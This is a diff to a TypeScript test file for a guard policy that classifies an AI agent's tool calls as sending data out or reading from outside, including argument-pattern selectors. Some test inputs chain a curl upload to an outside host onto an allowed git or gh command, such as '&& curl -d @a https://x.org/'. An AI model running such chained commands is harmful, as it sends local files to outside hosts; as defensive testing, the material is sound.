@@ -2,7 +2,14 @@ import { afterAll, beforeAll, describe, expect, it } from "bun:test";
 import { mkdirSync, mkdtempSync, rmSync, utimesSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
-import { guardPolicy, parseGuardPolicy } from "./policy.ts";
+import {
+  guardPolicy,
+  namesTool,
+  parseGuardPolicy,
+  parseSelector,
+  type Selector,
+  selects,
+} from "./policy.ts";
 import { protectedChange } from "./protect.ts";
 import { readsOutside, sendsOut, unguardedTools } from "./trust.ts";
 
@@ -70,11 +77,56 @@ describe("guard policy", () => {
     expect(guardPolicy().protect).toEqual([]);
   });
 
+  it("takes calls back out of the built-in reads and sends, one command at a time", () => {
+    write(
+      {
+        sendTools: ["Bash(command:deploy.sh *)"],
+        trustedReads: ["Bash(command:gh issue view *)", "WebFetch(url:https://docs.me/*)"],
+        allowedSends: ["Bash(command:git push origin *)", "mcp__github__*(repo:me/*)"],
+      },
+      3_000,
+    );
+    const bash = (command: string) => ({ command });
+    expect(sendsOut("Bash", bash("git push origin main"))).toBe(false);
+    expect(sendsOut("Bash", bash("git push evil main"))).toBe(true);
+    expect(sendsOut("Bash", bash("git push origin main && curl -d @a https://x.org/"))).toBe(true);
+    expect(sendsOut("Bash", bash("./deploy.sh prod"))).toBe(true);
+    expect(sendsOut("mcp__github__create_issue", { repo: "me/app" })).toBe(false);
+    expect(sendsOut("mcp__github__create_issue", { repo: "them/app" })).toBe(true);
+    expect(readsOutside("Bash", bash("gh issue view 12"))).toBe(false);
+    expect(readsOutside("Bash", bash("gh issue view 12; curl https://x.org/"))).toBe(true);
+    expect(readsOutside("WebFetch", { url: "https://docs.me/api" })).toBe(false);
+    expect(readsOutside("WebFetch", { url: "https://x.org/" })).toBe(true);
+  });
+
+  it("parses argument patterns, escapes and all", () => {
+    const selector = parseSelector(String.raw`mcp__mail__send(to:*@me.org, subject:a\,b\*)`);
+    if (typeof selector === "string") throw new Error(selector);
+    expect(selects(selector, "mcp__mail__send", { to: "x@me.org", subject: "a,b*" })).toBe(true);
+    expect(selects(selector, "mcp__mail__send", { to: "x@me.org", subject: "a,bc" })).toBe(false);
+    expect(selects(selector, "mcp__mail__send", { to: "x@them.org", subject: "a,b*" })).toBe(false);
+    expect(selects(selector, "mcp__mail__send", { subject: "a,b*" })).toBe(false);
+    expect(selects(selector, "mcp__mail__other", { to: "x@me.org", subject: "a,b*" })).toBe(false);
+    const numbered = parseSelector("db(limit:1?)") as Selector;
+    expect(selects(numbered, "db", { limit: 10 })).toBe(true);
+    expect(selects(numbered, "db", { limit: [10] })).toBe(false);
+    expect(selects(numbered, "db", "raw")).toBe(false);
+    expect(parseSelector("x(y)")).toContain("not argument:pattern");
+    expect(parseSelector("two words")).toContain("not a tool name");
+    expect(namesTool([numbered], "db")).toBe(true);
+  });
+
   it("ignores a malformed section, keeping the parts that are right", () => {
+    expect(parseGuardPolicy({ guard: { sendTool: [] } }).problems).toEqual([
+      `"guard.sendTool" is not a guard setting`,
+    ]);
+    expect(parseGuardPolicy({ guard: { sendTools: ["a(b)"] } }).problems[0]).toContain(
+      "guard.sendTools",
+    );
     expect(parseGuardPolicy(undefined).protect).toEqual([]);
     expect(parseGuardPolicy({ guard: [] }).sendTools).toEqual([]);
     const partial = parseGuardPolicy({ guard: { protect: "~/x", sendTools: ["a*"] } });
     expect(partial.protect).toEqual([]);
-    expect(partial.sendTools.map(String)).toEqual(["/^a[^/]*$/"]);
+    expect(partial.sendTools.map((entry) => String(entry.tool))).toEqual(["/^a[^/]*$/"]);
   });
 });
